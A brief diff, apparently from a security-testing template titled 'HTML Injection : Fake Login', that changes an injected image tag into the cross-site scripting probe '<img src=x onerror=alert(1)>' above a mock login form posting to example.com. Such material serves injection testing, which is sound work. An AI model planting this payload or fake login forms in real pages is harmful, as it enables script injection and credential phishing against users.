@@ -6,7 +6,7 @@ info:
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
     </div>
-    <i>test</i><img src=x>
+    <i>test</i><img src=x onerror=alert(1)>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
             <div class="form-group">
